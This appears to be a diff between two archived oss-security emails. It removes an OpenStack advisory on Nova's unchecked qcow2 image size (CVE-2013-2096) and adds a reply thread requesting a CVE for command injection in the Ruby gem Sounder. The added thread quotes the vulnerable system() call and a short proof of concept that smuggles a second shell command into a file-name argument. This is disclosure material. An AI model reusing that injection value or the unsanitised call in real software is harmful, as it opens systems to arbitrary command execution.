@@ -1,53 +1,50 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/05/16/7
-Message-ID: <5194A114.5030302@stillhq.com>
-Date: Thu, 16 May 2013 19:04:20 +1000
-From: Michael Still <mikal@...llhq.com>
-To: "openstack@...ts.launchpad.net" <openstack@...ts.launchpad.net>,  oss-security@...ts.openwall.com, openstack-announce@...ts.openstack.org
-Subject: [OSSA 2013-012] Nova fails to verify image virtual size (CVE-2013-2096)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/08/28/9
+Message-id: <ec7a0f8e-ed17-4cdb-8806-f2607f0e54da@me.com>
+Date: Wed, 28 Aug 2013 20:19:39 +0000 (GMT)
+From: "Larry W. Cashdollar" <larry0@...com>
+To: oss-security@...ts.openwall.com
+Subject: Re: Command Injection in Ruby Gem Sounder 1.0.1
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+Yes sir, Please assign a CVE.
 
-OpenStack Security Advisory: 2013-012
-CVE: CVE-2013-2096
-Date: May 16, 2013
-Title: Nova fails to verify image virtual size
-Reporter: Loganathan Parthipan
-Products: Nova
-Affects: All versions
+﻿Thank you!
+Larry C$
 
-Description:
-Loganathan Parthipan publicly reported a vulnerability in Nova. Nova
-did not implement checking for the virtual size of a qcow2 image used
-as ephemeral storage for instances. It is therefore possible for a
-user to create an image which has a large virtual size, but little
-data. Once the instance is created, the user can then proceed to fill
-the virtual disk, and consume all available disk on the host node file
-system.
+On Aug 28, 2013, at 12:36 PM, Henri Salo <henri@...v.fi> wrote:
 
-Havana (development branch) fix:
-https://review.openstack.org/28717
+> On Wed, Aug 28, 2013 at 03:06:14AM +0000, Larry W. Cashdollar wrote:
+>> Title: Command Injection in Ruby Gem Sounder 1.0.1
+>> Date: 8/10/2013
+>> Author: Larry W. Cashdollar @_larry0
+>> Download: https://rubygems.org/gems/sounder
+>>  
+>> CVE: TBD
+>> Description:
+>> Sounder is a ruby gem API for Mac OSX's afplay command.
+>> It passes user supplied data directly to command line.
+>> From lib/sounder/sound.rb:
+>> def play
+>> system %{/usr/bin/afplay "#{@...e}" &}
+>> end
+>> PoC:
+>> irb(main):098:0> @file = "\"id;/usr/bin/id>/tmp/p;\""
+>> => "\"id;/usr/bin/id>/tmp/p;\""
+>> irb(main):099:0> system %{/bin/echo "#{@...e}" }
+>> id
+>> sh: 1: : Permission denied
+>> => false
+>> irb(main):100:0>
+>> larry@...erfl0w:/tmp$ cat /tmp/p
+>> uid=1000(larry) gid=600(staff) groups=600(user)
+>> Author Notified: 8/9/2013
+>> Advisory: http://vapid.dhs.org/advisories/sounder-ruby-gem-cmd-inj.html
+>>  
+>
+> This was the CVE request (just to be clear).
+>
+> ---
+> Henri Salo
 
-Grizzly fix:
-https://review.openstack.org/28901
-
-Folsom fix:
-https://review.openstack.org/29192
-
-References:
-https://bugs.launchpad.net/nova/+bug/1177830
-http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2013-2096
-
-Thanks,
-Michael Still
-OpenStack Vulnerability Management Team
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.11 (GNU/Linux)
-Comment: Using GnuPG with Thunderbird - http://www.enigmail.net/
-
-iEYEARECAAYFAlGUoRQACgkQlhS32Mrx3702BgCeKZUDDA/W6Nj/xgC1a1n9vHvP
-vvoAnRfIOXnuvJ01c7IxGyXON7LIh5kt
-=YfoG
------END PGP SIGNATURE-----
+Content of type "text/html" skipped
